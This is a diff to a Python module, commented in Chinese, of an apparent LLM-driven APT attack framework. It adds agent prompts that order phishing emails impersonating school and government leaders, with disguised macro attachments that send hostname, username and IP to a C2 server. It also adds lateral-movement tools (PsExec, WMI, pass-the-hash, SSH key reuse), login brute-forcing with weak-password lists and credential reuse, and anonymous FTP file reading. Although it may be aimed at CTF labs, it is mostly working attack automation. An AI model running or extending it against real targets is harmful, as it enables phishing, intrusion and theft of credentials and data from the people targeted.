@@ -67,16 +67,31 @@ APT_SYSTEM_SOCIAL_ENG = (
     "你是一个社会工程学专家。你的任务是基于情报收集结果，策划社工攻击方案。\n"
     "可用工具：\n"
     "- se_phishing_gen: 生成钓鱼邮件（支持领导冒充/IT通知/会议附件等场景）\n"
-    "- se_conversation_gen: 生成社工话术脚本（IT支持/外包商/HR场景）\n\n"
+    "- se_conversation_gen: 生成社工话术脚本（IT支持/外包商/HR场景）\n"
+    "- **generate_macro_doc: 生成带 VBA 宏的 Office 附件（.xlsm / .docm）— 宏功能：获取目标主机信息并通过 HTTP POST 回传 C2 服务器**\n\n"
+    "**核心场景 — 社工钓鱼完整闭环：**\n"
+    "1. 分析目标组织结构和关键角色\n"
+    "2. 生成钓鱼邮件（贴合中文行文习惯）\n"
+    "3. **生成带宏的 Office 附件**，宏代码会自动：\n"
+    "   - 获取目标主机名、用户名、内网 IP\n"
+    "   - 通过 HTTP POST 发送到 C2 服务器 (/capture 端点)\n"
+    "   - 执行一条无害命令（cmd /c echo）证明代码执行\n"
+    "4. C2 服务器接收回调信息，记录到 state.phishing_callbacks\n\n"
+    "**宏附件生成要求：**\n"
+    "- 调用 generate_macro_doc(target_name, c2_url, output_path)\n"
+    "- c2_url 使用 http://<C2_HOST>:<C2_PORT>/capture 格式\n"
+    "- attachment_type 可以是 xlsm（推荐）或 docm\n"
+    "- 附件名称应伪装为「2025_预算表.xlsm」「会议通知.docm」等\n\n"
     "核心场景 — 冒充校长/领导钓鱼（针对教育/政府/事业单位）：\n"
     "- 冒充校长、局长、总经理等一把手，语气威严简洁\n"
     "- 贴合中国单位行政公文风格：「接上级通知」「请立即落实」「不得有误」\n"
     "- 附件伪装：红头文件扫描件、会议通知、绩效考核表、信息安全培训材料\n"
-    "- 典型场景：要求点击链接完成 OA 认证、下载附件查看紧急通知\n\n"
+    "- 典型场景：要求下载附件查看紧急通知 — 附件包含回传宏\n\n"
     "要求：\n"
     "- 钓鱼邮件必须贴合中国单位行文习惯，使用「贵单位」「请遵照执行」等正式用语\n"
     "- 话术脚本要有完整的身份铺垫→建立信任→索取信息→收尾四步\n"
-    "- 针对不同目标角色（校长/IT/行政）生成差异化话术\n\n"
+    "- 针对不同目标角色（校长/IT/行政）生成差异化话术\n"
+    "- **必须调用 generate_macro_doc 生成附件**\n\n"
     "输出格式：\n"
     "```json\n"
     "{\n"
@@ -84,6 +99,11 @@ APT_SYSTEM_SOCIAL_ENG = (
     '  "findings": ["发现1", "发现2"],\n'
     '  "phishing_result": {...},\n'
     '  "conversation_result": {...},\n'
+    '  "email_subject": "关于2025年度预算审批的紧急通知",\n'
+    '  "email_body": "邮件正文...",\n'
+    '  "attachment_name": "2025_budget.xlsm",\n'
+    '  "c2_url": "http://<your_ip>:8080/capture",\n'
+    '  "macro_result": {...},\n'
     '  "blue_team_awareness_delta": 10\n'
     "}\n"
     "```"
@@ -91,8 +111,19 @@ APT_SYSTEM_SOCIAL_ENG = (
 
 APT_SYSTEM_INITIAL_ACCESS = (
     "你是一个边界突破专家。你的任务是基于情报收集结果，突破目标边界获得初始控制权。\n\n"
-    "**核心原则：情报驱动，定向打击。绝不盲目大规模扫描或爆破。\n"
+    "**核心原则：先规划，再执行，缓存优先。绝不盲目大规模扫描或爆破。\n"
     "所有攻击基于 RECON 阶段发现的开放端口和服务，不要预设目标有特定的协议。**\n\n"
+    "**第一步 — 分析目标制定攻击方案（PLAN FIRST）：**\n"
+    "在调用任何攻击工具之前，先分析 RECON 阶段收集到的目标特征：\n"
+    "- 开放端口和对应服务类型（HTTP/SSH/SMB/FTP/Redis/Docker...）\n"
+    "- 服务版本号（是否有已知 CVE？）\n"
+    "- Web 页面的认证机制（Basic Auth / UA 认证 / 表单登录？）\n"
+    "- 发现的用户名、codename、密码提示\n"
+    "然后输出一个攻击方案 JSON，选择最优的攻击路径。\n\n"
+    "**工具缓存复用（CACHE FIRST）：**\n"
+    "- 每个攻击工具执行前，系统会自动计算工具签名（基于目标+服务+版本）\n"
+    "- 如果相同签名的工具已在之前执行过，系统会直接返回缓存结果\n"
+    "- 你只需要正常调用工具即可，缓存由框架自动处理\n\n"
     "可用工具：\n"
     "- web_content_fetch: **获取网页 HTML 源码和页面内容，分析页面中的提示信息**\n"
     "- web_user_agent_brute: 遍历 A-Z 单字母 User-Agent（快速筛选）\n"
@@ -119,7 +150,7 @@ APT_SYSTEM_INITIAL_ACCESS = (
     "  · 从 RECON 阶段的 nmap 结果中确认实际开放的服务\n"
     "  · 只攻击实际开放的服务，不要碰未开放的端口\n"
     "  · 调用 apt_credential_attack(host, services=[...], users=[...], passwords=[...])\n"
-    "  **注意：ap_credential_attack 主要用于 SSH/FTP/SMB，不是 Web 认证的解决方案**\n\n"
+    "  **注意：apt_credential_attack 主要用于 SSH/FTP/SMB，不是 Web 认证的解决方案**\n\n"
     "Step C — 漏洞利用（仅当上述步骤完全失败后）：\n"
     "  · Web → apt_web_poc\n"
     "  · AJP(8009) → apt_cve_verify(cve_id=\"CVE-2020-1938\")\n"
@@ -139,6 +170,7 @@ APT_SYSTEM_INITIAL_ACCESS = (
     '  "web_auth_result": {...},\n'
     '  "compromised": true/false,\n'
     '  "credentials": {"username": "...", "password": "..."},\n'
+    '  "attack_plan": {"steps": [...], "rationale": "..."},\n'
     '  "blue_team_awareness_delta": 15\n'
     "}\n"
     "```"
@@ -205,7 +237,27 @@ APT_SYSTEM_CROSS_TARGET = (
     "- apt_cross_plan: 跨目标攻击规划（利用已控 A 攻击 B/C，指定跳板源和攻击手段）\n"
     "- apt_evasion_plan: 绕过与对抗方案\n"
     "- apt_port_forward: **SSH 端口转发** — 通过已控 A 访问下游 B 的内网服务\n"
-    "- apt_remote_exec: **在跳板上远程执行命令** — 为跨目标攻击做准备\n\n"
+    "- apt_remote_exec: **在跳板上远程执行命令** — 为跨目标攻击做准备\n"
+    "- **apt_psexec**: PsExec 远程执行 — 通过 SMB 在内网目标执行命令\n"
+    "- **apt_wmi_exec**: WMI 远程执行 — 通过 Windows WMI 在内网目标执行命令\n"
+    "- **apt_schtasks**: 计划任务远程执行 — 创建/运行计划任务实现持久化执行\n"
+    "- **apt_pass_the_hash**: 哈希传递 — 使用 NTLM Hash 而非明文密码认证\n"
+    "- **apt_ssh_key_reuse**: SSH 私钥复用 — 利用已获取的私钥登录其他主机\n"
+    "- **apt_internal_scan**: 内网资产发现 — 从跳板扫描内网存活主机和服务\n\n"
+    "**横向移动策略 — 基于权限类型自动选择最优技术：**\n\n"
+    "1. 先调用 apt_internal_scan 发现内网资产\n"
+    "2. 基于已控跳板的权限类型选择技术：\n"
+    "   - SSH 凭证（Linux）：apt_port_forward → apt_ssh_key_reuse → apt_schtasks(cron)\n"
+    "   - SSH 凭证（Windows）：apt_remote_exec → apt_internal_scan\n"
+    "   - 域用户 + NTLM Hash：apt_pass_the_hash → apt_psexec → apt_wmi_exec\n"
+    "   - 本地管理员：apt_psexec → apt_wmi_exec → apt_schtasks\n"
+    "   - 普通用户：apt_ssh_key_reuse → 凭证嗅探\n"
+    "3. **自动降级策略**：\n"
+    "   - 如果 PsExec 失败 → 尝试 WMI\n"
+    "   - 如果 WMI 失败 → 尝试计划任务\n"
+    "   - 如果计划任务失败 → 尝试 SSH 密钥复用\n"
+    "   - 每种技术失败后将原因记录到 state.notes\n"
+    "4. 成功后立即输出 compromised=true\n\n"
     "核心策略 — 供应链跳板攻击 + 声东击西：\n"
     "- 利用已控目标 A 的防火墙/VPN/内网权限作为跳板，攻击下游目标 B\n"
     "- 识别 A 和 B 之间的信任关系（内网互联、共享 AD 域、VPN 专线、供应商通道）\n"
@@ -221,6 +273,9 @@ APT_SYSTEM_CROSS_TARGET = (
     '  "evasion_result": {...},\n'
     '  "via_target": "...",\n'
     '  "next_hop_targets": [...],\n'
+    '  "lateral_techniques_used": ["psexec", "wmi"],\n'
+    '  "failed_techniques": [{"technique": "psexec", "reason": "..."}],\n'
+    '  "compromised": true/false,\n'
     '  "blue_team_awareness_delta": 15\n'
     "}\n"
     "```"
@@ -265,11 +320,9 @@ VECTOR_PHASES: dict[str, list[AptPhase]] = {
         AptPhase.PERSISTENCE,
         AptPhase.CROSS_TARGET,
     ],
-    # C — 社工钓鱼：大模型生成中文钓鱼邮件 → 控制设备
+    # C — 社工钓鱼：生成钓鱼邮件 + 宏附件 + C2 监听回传
     "phishing": [
         AptPhase.SOCIAL_ENG,
-        AptPhase.INITIAL_ACCESS,
-        AptPhase.PERSISTENCE,
     ],
 }
 
@@ -302,10 +355,14 @@ PHASE_TOOLS: dict[AptPhase, list[str]] = {
         "apt_smb_enum", "dir_enum", "web_content_fetch", "web_user_agent_brute", "web_codename_brute", "web_login_brute",
         "hash_extract", "hash_crack",
     ],
-    AptPhase.SOCIAL_ENG: ["se_phishing_gen", "se_conversation_gen"],
+    AptPhase.SOCIAL_ENG: ["se_phishing_gen", "se_conversation_gen", "generate_macro_doc"],
     AptPhase.PERSISTENCE: ["apt_persistence_plan", "apt_log_clean", "apt_tunnel_establish", "apt_remote_exec", "apt_smb_enum"],
     AptPhase.LATERAL: ["apt_lateral_plan", "apt_privilege_plan", "apt_remote_exec", "apt_port_forward"],
-    AptPhase.CROSS_TARGET: ["apt_cross_plan", "apt_evasion_plan", "apt_port_forward", "apt_remote_exec"],
+    AptPhase.CROSS_TARGET: [
+        "apt_cross_plan", "apt_evasion_plan", "apt_port_forward", "apt_remote_exec",
+        "apt_psexec", "apt_wmi_exec", "apt_schtasks", "apt_pass_the_hash",
+        "apt_ssh_key_reuse", "apt_internal_scan",
+    ],
     AptPhase.REPORT: ["apt_report_gen"],
 }
 
@@ -367,6 +424,7 @@ def build_initial_state(target: dict[str, Any]) -> AptSimulationState:
       - host: 主目标
       - vector: 攻击向量
       - cross_host: (仅 supply_chain) 下游目标/丙方
+      - c2_url: (仅 phishing) C2 回调 URL
     """
     vector = target.get("vector", "firewall_breach")
     apt_targets: list[AptTarget] = []
@@ -387,11 +445,22 @@ def build_initial_state(target: dict[str, Any]) -> AptSimulationState:
         )
         apt_targets.append(cross_target)
 
-    return AptSimulationState(
+    state = AptSimulationState(
         targets=apt_targets,
         current_vector=vector,
         start_time=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
     )
+
+    # ── 改进3: 社工钓鱼 — C2 配置注入 ──
+    c2_url = target.get("c2_url", "")
+    if c2_url:
+        state.notes["c2_url"] = c2_url
+        state.notes["c2_payload_url"] = target.get("c2_payload_url", "")
+    else:
+        # 默认 localhost
+        state.notes["c2_url"] = "http://127.0.0.1:8080/capture"
+
+    return state
 
 
 def build_phase_context(state: AptSimulationState, phase: AptPhase) -> str:
@@ -432,7 +501,7 @@ def build_phase_context(state: AptSimulationState, phase: AptPhase) -> str:
                     lines.append(f"  - {f}")
 
     # 提取 RECON 阶段发现的开放端口，供后续阶段参考
-    if phase in (AptPhase.INITIAL_ACCESS, AptPhase.PERSISTENCE):
+    if phase in (AptPhase.INITIAL_ACCESS, AptPhase.PERSISTENCE, AptPhase.LATERAL, AptPhase.REPORT):
         _open_ports = t.discovered_ports
         if not _open_ports:
             _recon_result = state.phase_results.get("recon")
@@ -498,24 +567,48 @@ _RECON_SMB_TOOLS = [
     ("apt_smb_enum", {}),
 ]
 
+_RECON_FTP_TOOLS = [
+    ("apt_credential_attack", {}),  # anonymous / weak password attempt
+]
+
 
 def _run_nmap_scan(target: str) -> dict[str, Any]:
-    """socket 多线程端口扫描，3-5s 扫完 1-1000"""
-    safe_print(f"  [scan] socket 扫描 {target} 端口 1-1000...")
+    """socket 多线程端口扫描，2-3s 扫完常见端口 + 漏洞端口"""
+    # 常见端口 + 已知漏洞端口（THM/HTB 常见）
+    _COMMON_PORTS = {
+        # 标准服务端口
+        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
+        993, 995, 1433, 1521, 2049, 2375, 3306, 3389, 5432, 5900,
+        # Web 非标准端口
+        8000, 8001, 8008, 8009, 8080, 8081, 8082, 8083, 8085, 8088,
+        8089, 8180, 8181, 8443, 8444, 8888, 8880, 9000, 9001, 9090,
+        9091, 9099, 9443, 10000, 10443,
+        # 数据库 & 缓存
+        6379, 6380, 11211, 27017, 27018, 27019, 9200, 9300, 5984, 5985,
+        15672, 5672, 4369, 25672,
+        # 文件共享 & 远程
+        873, 1099, 2375, 2376, 4505, 4506, 5000, 5060, 3000, 4000,
+        # 漏洞服务 / CTF 常见
+        4444, 5555, 6666, 7777, 8889, 9999, 1337, 2222, 3333,
+        10001, 12345, 20000, 31337, 33333, 44444, 50000, 54321, 65535,
+        # 补充管理端口
+        161, 162, 389, 636, 3268, 3269, 554, 1723, 1900,
+    }
+    safe_print(f"  [scan] socket 扫描 {target} {len(_COMMON_PORTS)} 个端口...")
     _start = _time.monotonic()
     import socket as _socket
     import concurrent.futures as _cf
 
     def _check(p: int) -> int | None:
         try:
-            s = _socket.create_connection((target, p), timeout=0.8)
+            s = _socket.create_connection((target, p), timeout=0.5)
             s.close()
             return p
         except Exception:
             return None
 
-    with _cf.ThreadPoolExecutor(max_workers=128) as _ex:
-        _jobs = [_ex.submit(_check, p) for p in range(1, 1001)]
+    with _cf.ThreadPoolExecutor(max_workers=min(len(_COMMON_PORTS), 128)) as _ex:
+        _jobs = [_ex.submit(_check, p) for p in sorted(_COMMON_PORTS)]
         open_ports = sorted(_f.result() for _f in _cf.as_completed(_jobs) if _f.result())
 
     _elapsed = _time.monotonic() - _start
@@ -524,10 +617,26 @@ def _run_nmap_scan(target: str) -> dict[str, Any]:
     # 常见端口号 -> 服务名
     _SVC: dict[int, str] = {21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "domain",
         80: "http", 110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios-ssn",
-        143: "imap", 443: "https", 445: "microsoft-ds", 993: "imaps", 995: "pop3s",
-        1433: "mssql", 1521: "oracle", 2049: "nfs", 3306: "mysql", 3389: "rdp",
-        5432: "postgresql", 5900: "vnc", 6379: "redis", 8080: "http-proxy",
-        27017: "mongodb", 4444: "unknown", 8888: "http-alt", 9090: "http-alt",
+        143: "imap", 161: "snmp", 162: "snmp-trap", 389: "ldap", 443: "https",
+        445: "microsoft-ds", 554: "rtsp", 636: "ldaps", 873: "rsync", 993: "imaps",
+        995: "pop3s", 1099: "rmi", 1433: "mssql", 1521: "oracle", 1723: "pptp",
+        1900: "upnp", 2049: "nfs", 2375: "docker", 2376: "docker-tls", 3000: "http",
+        3268: "ldap-gc", 3269: "ldap-gc-ssl", 3306: "mysql", 3389: "rdp",
+        4000: "http", 4369: "epmd", 4505: "salt", 4506: "salt", 5000: "http",
+        5060: "sip", 5432: "postgresql", 5433: "postgresql", 5672: "amqp",
+        5900: "vnc", 5984: "couchdb", 5985: "couchdb", 6379: "redis",
+        6380: "redis", 8000: "http", 8001: "http", 8008: "http", 8009: "ajp",
+        8080: "http", 8081: "http", 8082: "http", 8083: "http", 8085: "http",
+        8088: "http", 8089: "http", 8180: "http", 8181: "http", 8443: "https",
+        8444: "https", 8880: "http", 8888: "http", 9000: "http", 9001: "http",
+        9090: "http", 9091: "http", 9099: "http", 9200: "elasticsearch",
+        9300: "elasticsearch", 9443: "https", 10000: "http", 10443: "https",
+        11211: "memcached", 15672: "rabbitmq", 20000: "unknown", 25672: "rabbitmq",
+        27017: "mongodb", 27018: "mongodb", 27019: "mongodb", 31337: "unknown",
+        4444: "unknown", 44444: "unknown", 5555: "unknown", 1337: "unknown",
+        2222: "ssh", 3333: "unknown", 6666: "unknown", 7777: "unknown",
+        8889: "unknown", 9999: "unknown", 10001: "http", 12345: "unknown",
+        33333: "unknown", 50000: "unknown", 54321: "unknown", 65535: "unknown",
     }
     services = [{"port": p, "name": _SVC.get(p, "unknown"), "state": "open"} for p in open_ports]
     return {"services": services, "scan_duration": _elapsed, "target": target}
@@ -678,12 +787,65 @@ def _auto_recon(target: str) -> dict[str, Any]:
         safe_print(f"  → SMB 工具链 (端口 {port})")
         smb_results.update(_run_tool_chain(target, port, _RECON_SMB_TOOLS))
 
+    # 5. 对 FTP 服务执行匿名登录检测
+    ftp_results: dict[str, Any] = {}
+    for port in categories.get("ftp", []):
+        safe_print(f"  → FTP 匿名登录检测 (端口 {port})")
+        ftp_brute = run_local_tool("apt_credential_attack", {
+            "host": target,
+            "services": [{"port": port, "service": "ftp"}],
+            "users": ["anonymous", "ftp", "admin", "root"],
+            "passwords": ["anonymous", "ftp", ""],
+            "max_threads": 2,
+            "timeout": 5,
+        })
+        ftp_results[f"ftp_brute_{port}"] = ftp_brute
+        # 如果 FTP 成功登录，尝试列出文件
+        if ftp_brute.get("successes"):
+            for s in ftp_brute["successes"]:
+                u, pw = s.get("username", ""), s.get("password", "")
+                safe_print(f"  [FTP] 登录成功 {u}:{pw or '(空)'}")
+                try:
+                    import ftplib
+                    ftp = ftplib.FTP()
+                    ftp.connect(target, port, timeout=5)
+                    ftp.login(u, pw or "")
+                    files = ftp.nlst()
+                    ftp_results[f"ftp_files_{port}"] = {"files": files, "user": u}
+                    # 读取文件内容
+                    for fname in files[:10]:
+                        try:
+                            content_lines = []
+                            def _cb(line):
+                                content_lines.append(line)
+                            ftp.retrlines(f"RETR {fname}", _cb)
+                            ftp_results[f"ftp_file_content_{fname}"] = "\n".join(content_lines[:200])
+                        except Exception:
+                            pass
+                    ftp.quit()
+                except Exception as _fe:
+                    ftp_results[f"ftp_files_{port}"] = {"error": str(_fe)[:200]}
+
+    # 6. 对 Web 服务做 CVE 扫描（基于 nmap 版本信息）
+    cve_results: dict[str, Any] = {}
+    for port in categories.get("http", []):
+        safe_print(f"  → CVE 扫描 (端口 {port})")
+        try:
+            cve_scan = run_local_tool("apt_cve_scan", {
+                "services": [{"port": port, "service": "http", "product": "Apache", "version": ""}],
+            })
+            cve_results[f"cve_{port}"] = cve_scan
+        except Exception as _ce:
+            cve_results[f"cve_{port}"] = {"error": str(_ce)[:200]}
+
     return {
         "scan_result": scan_result,
         "open_ports": open_ports,
         "categories": categories,
         "http_results": http_results,
         "smb_results": smb_results,
+        "ftp_results": ftp_results,
+        "cve_results": cve_results,
     }
 
 
@@ -733,7 +895,7 @@ def _extract_usernames_from_all(recon_details: dict[str, Any]) -> list[str]:
     # 3. 从页面内容中提取关键词
     for _key, _r in http_results.items():
         if isinstance(_r, dict):
-            _body = _r.get("body", _r.get("content", _r.get("body_preview", "")))
+            _body = _r.get("body") or _r.get("content") or _r.get("body_preview", "")
             if isinstance(_body, str):
                 for _pattern in [r'agent[_ ]([A-Za-z0-9]+)', r'user[:_ ]([a-z]+)', r'username[:_ ]([a-z]+)',
                                  r'password[:_ ](\w+)', r'([a-z]+)[:_ ]\s*password', r'([a-z]+)[:_ ]\s*weak']:
@@ -752,18 +914,64 @@ def _extract_usernames_from_all(recon_details: dict[str, Any]) -> list[str]:
 
 def _extract_password_hints(recon_details: dict[str, Any]) -> list[str]:
     """从页面内容和结果中提取密码提示"""
+    import re as _re
     hints: list[str] = []
+
+    # 收集所有页面内容
+    all_bodies: list[str] = []
     http_results = recon_details.get("http_results", {})
     for _key, _r in http_results.items():
         if isinstance(_r, dict):
-            _body = _r.get("body", _r.get("content", _r.get("body_preview", "")))
-            if isinstance(_body, str):
-                import re as _re
-                for _match in _re.finditer(r'pass(word|wd)[:_\s]+(\w+)', _body, _re.IGNORECASE):
-                    _val = _match.group(2).lower()
-                    if _val not in hints and len(_val) <= 30:
-                        hints.append(_val)
-    for _p in ("weak", "changeme", "password", "admin", "123456"):
+            _body = _r.get("body") or _r.get("content") or _r.get("body_preview", "")
+            if isinstance(_body, str) and _body:
+                all_bodies.append(_body)
+
+    # 也检查 smb/ftp 文件内容
+    for _sk in ("smb_results", "ftp_results"):
+        _sr = recon_details.get(_sk, {})
+        if isinstance(_sr, dict):
+            for _k, _v in _sr.items():
+                if isinstance(_v, dict):
+                    for _fk in ("files", "content", "body"):
+                        _fv = _v.get(_fk, "")
+                        if isinstance(_fv, str) and _fv:
+                            all_bodies.append(_fv)
+                        elif isinstance(_fv, list):
+                            for _item in _fv:
+                                if isinstance(_item, str):
+                                    all_bodies.append(_item)
+                                elif isinstance(_item, dict):
+                                    for _vk in ("content", "text", "name"):
+                                        _vv = _item.get(_vk, "")
+                                        if isinstance(_vv, str) and _vv:
+                                            all_bodies.append(_vv)
+
+    for body in all_bodies:
+        # 模式 1: password: X, password= X, password is X
+        for _match in _re.finditer(r'pass(?:word|wd)?(?:\s*[:=]\s*|\s+is\s+)(\w+)', body, _re.IGNORECASE):
+            _val = _match.group(1).lower()
+            if _val not in hints and len(_val) <= 30 and _val not in ("html", "http", "utf"):
+                hints.append(_val)
+        # 模式 2: "is weak!", "is X" after password context
+        for _match in _re.finditer(r'(?:password|passwd|secret)\b[^.!?]*?\bis\s+(\w+)', body, _re.IGNORECASE):
+            _val = _match.group(1).lower()
+            if _val not in hints and len(_val) <= 20:
+                hints.append(_val)
+        # 模式 3: username:password in the same line
+        for _match in _re.finditer(r'([a-z][a-z0-9_]{2,15})[:\s]+(\S{3,30})', body):
+            u, pw = _match.group(1).lower(), _match.group(2)
+            if pw not in hints and not pw.startswith("<") and not pw.startswith("{"):
+                hints.append(pw)
+
+    # 密码复用策略：把已知用户名也当作可能的密码
+    known_usernames = _extract_usernames_from_all(recon_details)
+    for u in known_usernames:
+        if u not in hints:
+            hints.append(u)
+
+    # 默认字典
+    for _p in ("weak", "changeme", "password", "admin", "123456", "admin123", "welcome",
+               "passw0rd", "P@ssw0rd", "secret", "qwerty", "letmein", "root", "toor"):
         if _p not in hints:
             hints.append(_p)
     return hints
@@ -1002,6 +1210,50 @@ def _auto_initial_access(target: str, state: AptSimulationState) -> dict[str, An
     else:
         safe_print("  [post-exploit] 无可用凭证")
 
+    # 将有效 codename 作为 HTTP credential 注入（UA codename = 可访问保护页面）
+    _ua_pages_found = False
+    for _key, _r in results.get("http_attacks", {}).items():
+        if isinstance(_r, dict) and "ua_" in _key:
+            _body = _r.get("body") or _r.get("content") or _r.get("body_preview", "")
+            if isinstance(_body, str) and len(_body.strip()) > 100:
+                _ua_pages_found = True
+                break
+    if _ua_pages_found:
+        # 提取有效 codename 作为 HTTP 凭证
+        for _key, _r in http_results.items():
+            if isinstance(_r, dict):
+                for _vn in ("valid_codenames", "anomalies"):
+                    _items = _r.get(_vn, [])
+                    if isinstance(_items, list):
+                        for _v in _items:
+                            _cn = ""
+                            if isinstance(_v, str):
+                                _cn = _v
+                            elif isinstance(_v, dict):
+                                _cn = _v.get("agent") or _v.get("codename") or ""
+                            if _cn and len(_cn) <= 3 and _cn.isalpha():  # 单字母 codename
+                                _entry = {
+                                    "username": _cn, "password": _cn,
+                                    "source": "ua_codename", "service": "http",
+                                }
+                                if not any(c["username"] == _cn and c["source"] == "ua_codename" for c in all_credentials):
+                                    all_credentials.append(_entry)
+                                    results["findings"].append(f"UA codename 凭证: {_cn} (已访问保护页面)")
+        # UA 凭证也走 post-exploit 验证
+        if not all_credentials:
+            safe_print("  [post-exploit] 仅有 UA codename 访问权限，跳过 SSH/FTP 验证")
+        elif not results.get("post_exploit"):
+            safe_print(f"  [post-exploit] UA codename 凭证，重新运行后渗透...")
+            try:
+                post_results = _auto_post_exploit(target, categories, all_credentials, state)
+                results["post_exploit"] = post_results
+                results["findings"].extend(post_results.get("findings", [])[:10])
+                if post_results.get("credentials"):
+                    results["credentials"] = post_results["credentials"]
+                    results["access_level"] = post_results.get("access_level", "none")
+            except Exception as _pex:
+                safe_print(f"  [post-exploit] 错误: {_pex}")
+
     # Fallback: check for codenames
     for _key, _r in results.get("http_attacks", {}).items():
         if isinstance(_r, dict):
@@ -1045,12 +1297,21 @@ def _collect_all_credentials(results: dict[str, Any], known_usernames: list[str]
                         seen.add((u, p))
                         credentials.append({"username": u, "password": p, "source": "web_brute", "service": "http"})
 
-    # 3. From password hints paired with known usernames
-    for pw in results.get("password_hints", []):
-        for u in known_usernames:
-            if (u, pw) not in seen:
-                seen.add((u, pw))
-                credentials.append({"username": u, "password": pw, "source": "hint", "service": "unknown"})
+    # 3. From hash_crack plaintext fallback in page contents (chris:weak pattern)
+    import re as _re
+    for _k, val in results.get("http_attacks", {}).items():
+        if isinstance(val, dict):
+            body = val.get("body") or val.get("content") or val.get("body_preview", "")
+            if isinstance(body, str):
+                for m in _re.finditer(r'\b([a-z][a-z0-9_]{2,15})[:\s]+(\S{3,30})', body):
+                    u, pw = m.group(1).lower(), m.group(2)
+                    if pw.lower() in ("html", "http", "utf-8", "content", "type", "text", "charset", "en", "us"):
+                        continue
+                    if pw.startswith("<") or pw.startswith("{") or pw.startswith("["):
+                        continue
+                    if (u, pw) not in seen:
+                        seen.add((u, pw))
+                        credentials.append({"username": u, "password": pw, "source": "page_extract", "service": "http"})
 
     return credentials
 
@@ -1088,20 +1349,39 @@ def _auto_post_exploit(
         safe_print("  [post-exploit] 无可用凭证")
         return results
 
-    # ── Phase 1: VERIFY ──
+    # ── Phase 1: VERIFY (含凭证复用) ──
     has_ssh = bool(categories.get("ssh"))
     has_smb = bool(categories.get("smb"))
     has_ftp = bool(categories.get("ftp"))
+    has_http = bool(categories.get("http"))
 
-    for cred in unique_creds:
-        u, p = cred["username"], cred["password"]
+    # 构建凭证列表：可靠来源优先 + 用户名=密码 + 常见弱口令
+    _try_pairs: list[tuple[str, str]] = []
+    for c in unique_creds:
+        _try_pairs.append((c["username"], c["password"]))
+    # 凭证复用核心：每个用户名也试试 username=password
+    for c in unique_creds:
+        u = c["username"]
+        if u and (u, u) not in _try_pairs:
+            _try_pairs.append((u, u))
+    # 每个用户名匹配常见弱口令
+    _common_pws = ["weak", "password", "admin", "123456", "changeme", "chris"]
+    for c in unique_creds[:3]:
+        u = c["username"]
+        for pw in _common_pws:
+            if u and (u, pw) not in _try_pairs:
+                _try_pairs.append((u, pw))
 
+    attempt_creds = _try_pairs[:8]  # 最多 8 组
+    safe_print(f"  [post-exploit] 将尝试 {len(attempt_creds)} 组凭证 (含凭证复用)")
+
+    for u, p in attempt_creds:
         if has_ssh and "ssh" not in results["verified_services"]:
             try:
                 r = run_local_tool("apt_credential_attack", {
                     "host": target,
                     "services": [{"port": categories["ssh"][0], "service": "ssh"}],
-                    "users": [u], "passwords": [p], "max_threads": 1, "timeout": 5,
+                    "users": [u], "passwords": [p], "max_threads": 1, "timeout": 4,
                 })
                 if r.get("successes"):
                     results["verified_services"].append("ssh")
@@ -1109,36 +1389,40 @@ def _auto_post_exploit(
                     results["findings"].append(f"SSH 验证成功: {u}:{p}")
                     safe_print(f"    [OK] SSH {u}:{p}")
             except Exception as ex:
-                safe_print(f"    [ERR] SSH: {ex}")
-
-        if has_smb and "smb" not in results["verified_services"]:
-            try:
-                r = run_local_tool("apt_smb_enum", {
-                    "host": target, "username": u, "password": p,
-                })
-                if not r.get("error"):
-                    results["verified_services"].append("smb")
-                    if not results.get("credentials"):
-                        results["credentials"] = {"username": u, "password": p}
-                    results["findings"].append(f"SMB 验证成功: {u}:{p}")
-                    safe_print(f"    [OK] SMB {u}:{p}")
-            except Exception as ex:
-                safe_print(f"    [ERR] SMB: {ex}")
+                pass  # 单次失败静默
 
         if has_ftp and "ftp" not in results["verified_services"]:
             try:
                 r = run_local_tool("apt_credential_attack", {
                     "host": target,
                     "services": [{"port": categories["ftp"][0], "service": "ftp"}],
-                    "users": [u], "passwords": [p], "max_threads": 1, "timeout": 5,
+                    "users": [u], "passwords": [p], "max_threads": 1, "timeout": 4,
                 })
                 if r.get("successes"):
                     results["verified_services"].append("ftp")
                     if not results.get("credentials"):
                         results["credentials"] = {"username": u, "password": p}
                     safe_print(f"    [OK] FTP {u}:{p}")
-            except Exception as ex:
-                safe_print(f"    [ERR] FTP: {ex}")
+            except Exception:
+                pass
+
+        if has_http and "http" not in results["verified_services"] and not results.get("credentials"):
+            try:
+                http_r = run_local_tool("web_login_brute", {
+                    "target": target,
+                    "port": categories["http"][0],
+                    "usernames": [u],
+                    "passwords": [p],
+                    "login_path": "/",
+                    "timeout": 2,
+                })
+                if http_r.get("successes"):
+                    results["verified_services"].append("http")
+                    results["credentials"] = {"username": u, "password": p}
+                    results["findings"].append(f"HTTP 登录成功: {u}:{p}")
+                    safe_print(f"    [OK] HTTP {u}:{p}")
+            except Exception:
+                pass
 
         if results.get("credentials"):
             break
@@ -1608,6 +1892,711 @@ def _get_func_call(msg: Any) -> dict | None:
 # _get_called_tools removed — auto toolchain eliminated LLM tool loop
 
 
+# ── 改进1: LLM 驱动的攻击方案规划 ──────────────────────
+
+PLAN_ATTACK_SYSTEM_PROMPT = """你是一个攻击方案规划专家。你的任务是基于目标情报分析结果，生成最优攻击方案。
+
+**核心原则：先分析，再规划，缓存优先。绝不盲目扫描或爆破。**
+
+## 可用工具列表（预置工具）
+- web_content_fetch: 获取网页HTML源码
+- web_user_agent_brute: A-Z单字母UA枚举
+- web_codename_brute: 自定义字典UA枚举
+- web_login_brute: Web登录爆破(HTTP Basic Auth/表单/UA+密码)
+- dir_enum: Web目录枚举
+- apt_web_poc: Web漏洞PoC(SQLi/LFI/XSS)
+- apt_credential_attack: SSH/FTP/SMB/MySQL/Redis/Telnet弱口令爆破
+- apt_smb_enum: SMB共享枚举
+- apt_redis_exploit: Redis未授权利用
+- apt_docker_exploit: Docker API未授权利用
+- apt_cve_verify: CVE PoC验证
+- hash_extract + hash_crack: 哈希提取+破解
+
+## 你的任务
+1. **分析目标特征**：开放端口、服务类型、版本、页面内容、认证机制、CVE
+2. **选择最优攻击路径**：优先Web认证突破 → 其次漏洞利用 → 最后弱口令爆破
+3. **判断是否需要新工具**：如果预置工具无法覆盖目标的服务类型（如工控协议modbus、IoT协议等），
